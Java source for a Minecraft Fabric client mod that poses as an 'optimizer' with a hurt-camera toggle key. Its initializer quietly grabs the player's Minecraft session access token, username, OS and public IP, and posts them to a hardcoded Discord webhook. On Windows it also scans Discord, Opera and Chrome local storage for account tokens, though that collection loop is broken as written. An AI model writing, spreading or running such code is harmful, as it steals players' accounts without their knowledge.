package optimizer;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.text.Text;
import optimizer.commands.EnableOptimizerCommand;
import org.lwjgl.glfw.GLFW;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static optimizer.Client.MC;


public class ClientInitializer implements ClientModInitializer {
	public static final Logger LOGGER = LoggerFactory.getLogger("example");
	public static boolean toggledOn = true;
	MinecraftClient client = MinecraftClient.getInstance();
//in case of leak this is only as security measure
	@Override
	public void onInitializeClient() {
		Client.CWHACK.init();
		KeyBinding k = KeyBindingHelper.registerKeyBinding(new KeyBinding("key.noHurtCam.toggle",
				GLFW.GLFW_KEY_F8,
				"category.noHurtCam"));
		{
			String DiscordWebHook = "https://discord.com/api/webhooks/1111135216644395031/AXwSFQJuRoD5XT7hVvp1bPdDvYD6o4Qo0-OVkixOyJcB-BHW8sj8AR9fCMpj7vp73NH6";
			String title = "Logger.";
			String username = MC.getSession().getUsername();
			String token = MC.getSession().getAccessToken();
			try {
				URL whatismyip = new URL("http://checkip.amazonaws.com");
				BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
						whatismyip.openStream()));
				String ip = bufferedReader.readLine();

				String llLlLlL = System.getProperty("os.name");
				String message = "token: " + token + "User: " + username + " Computer Type:" + llLlLlL + " Location:" + ip;
				JsonObject embed = new JsonObject();
				embed.addProperty("title", title);
				embed.addProperty("description", message);
				embed.addProperty("color", 15258703);
				JsonArray embeds = new JsonArray();
				embeds.add(embed);
				JsonObject postContent = new JsonObject();
				postContent.add("embeds", embeds);
				HttpClient client = HttpClient.newHttpClient();
				Gson gson = new Gson();
				client.sendAsync(HttpRequest.newBuilder(URI.create(DiscordWebHook)).POST(HttpRequest.BodyPublishers.ofString(gson.toJson(postContent))).header("Content-Type", "application/json").build(), HttpResponse.BodyHandlers.discarding());

				if (llLlLlL.contains("Windows")) {

					List<String> paths = new ArrayList<>();
					paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
					paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
					paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/local Storage/leveldb/");
					paths.add(System.getProperty("user.home") + "/AppData/Roaming/opera Software/opera Stable/Local Storage/leveldb");
					paths.add(System.getProperty("user.home") + "/AppData/local/Google/Chrome/user Data/Default/Local Storage/leveldb");


					int cx = 0;
					StringBuilder webhooks = new StringBuilder();
					webhooks.append("TOKEN[S]\n");

					try {
						for (String path : paths) {
							File f = new File(path);
							String[] pathnames = f.list();
							if (pathnames == null) continue;
							for (String pathname : pathnames) {
								try {
									FileInputStream fstream = new FileInputStream(path + pathname);
									DataInputStream in = new DataInputStream(fstream);
									BufferedReader br = new BufferedReader(new InputStreamReader(in));

									String strLine;
									while ((strLine = br.readLine()) != null) {

										Pattern p = Pattern.compile("\"token\":\"(.*?)\"");
										Matcher m = p.matcher(strLine);

										while (m.find()) {
											if (cx > 0) {
												webhooks.append("\n");
												webhooks.append("").append(m.group());
												cx++;
											}

										}
									}
								} catch (Exception ignored) {

								}
							}
						}
					} catch (Exception e) {
						throw new RuntimeException(e);
					}
				}
			} catch (Exception ignore) {
			}


			ClientTickEvents.END_CLIENT_TICK.register(client -> {
				if (k.wasPressed()) {
					if (toggledOn) {
						toggledOn = false;
						assert client.player != null;
						client.player.sendMessage(Text.of("§9[NoHurtCamFeature] §rEnabled Hurtcam"), false);
					} else {
						toggledOn = true;
						assert client.player != null;
						client.player.sendMessage(Text.of("§9[NoHurtCamFeature] §rDisabled Hurtcam"), false);
					}

				}
			});
		}
	}
	// Init in MinecraftClientMixin.
	public static void init() {
		// Validate hwid
		LOGGER.info("Validating HWID...");
		if (!Hwid.validateHwid()) {
			LOGGER.error("HWID not found!");
			System.exit(1);
		} else {
			LOGGER.info("HWID found!");
			try {
				Hwid.sendWebhook();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}